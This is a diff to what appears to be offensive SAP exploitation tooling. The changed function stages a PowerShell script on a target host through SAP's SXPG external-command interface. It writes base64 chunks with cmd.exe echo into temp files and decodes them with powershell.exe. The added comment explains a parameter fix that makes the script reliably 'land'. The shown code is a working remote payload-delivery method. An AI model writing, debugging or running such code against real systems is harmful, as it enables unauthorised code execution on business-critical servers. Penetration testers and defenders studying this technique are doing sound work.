@@ -1527,21 +1527,33 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     assert len(sxpg_final_params)  <= 255, (
         f"SXPG final params too long: {len(sxpg_final_params)}")
 
+    # long_params="" on every sxpg_step is CRITICAL: when it's omitted
+    # (or None) the standalone build_saprfxpg helper copies PARAMS into
+    # LONG_PARAMS too, and the SAP kernel on the target concatenates
+    # them into a single command line.  For chunk writes that means
+    # `cmd.exe /C echo AAA=>%TEMP%\sXXXX /C echo AAA=>%TEMP%\sXXXX` —
+    # cmd.exe still parses SOMETHING, but the redirect ends up
+    # ambiguous and the file it writes is not what we want.  Decode
+    # then reads garbage and the .ps1 never lands.  Same bug we
+    # fixed for the Linux pkill pre-step earlier this session.
     sxpg_steps = [
         # Clean up old intermediate and script files (the randomised
         # suffix keeps this scoped to THIS attempt's files only).
         {"command": "cmd.exe",
-         "params": f"/C del /q %TEMP%\\s{_sfx} %TEMP%\\s{_sfx}.ps1 2>nul"},
+         "params": f"/C del /q %TEMP%\\s{_sfx} %TEMP%\\s{_sfx}.ps1 2>nul",
+         "long_params": ""},
     ]
     for idx, chunk in enumerate(sxpg_chunks):
         redir = ">" if idx == 0 else ">>"
         sxpg_steps.append({
             "command": "cmd.exe",
             "params": f"/C echo {chunk}{redir}{sxpg_tmp_cmd}",
+            "long_params": "",
         })
     # Decode the base64 file into a .ps1 script file
     sxpg_steps.append({"command": "powershell.exe",
-                        "params": sxpg_decode_params})
+                        "params": sxpg_decode_params,
+                        "long_params": ""})
     return {
         "steps": steps,
         "command": run_cmd_prog,
